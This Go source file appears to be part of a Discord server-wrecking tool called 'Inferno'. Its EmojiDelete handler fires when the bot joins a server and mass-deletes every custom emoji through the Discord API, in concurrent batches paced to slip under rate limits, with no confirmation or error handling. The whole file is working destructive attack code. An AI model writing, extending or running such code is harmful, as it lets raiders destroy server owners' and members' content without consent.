package removing

import (
	"Inferno/core/requests"
	"encoding/json"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

func EmojiDelete(s *discordgo.Session, event *discordgo.GuildCreate) {
	emojis, _ := s.GuildEmojis(event.ID)
	smoothed := requests.Smooth(emojis)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, emoji := range ch {
			go func(emoji *discordgo.Emoji) {
				defer wg.Done()

				emojid := emoji.ID

				data := []byte{}
				jsonData, _ := json.Marshal(data)

				requests.Sendhttp("https://discord.com/api/v9/guilds/"+event.ID+"/emojis/"+emojid, "DELETE", jsonData)
			}(emoji)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}
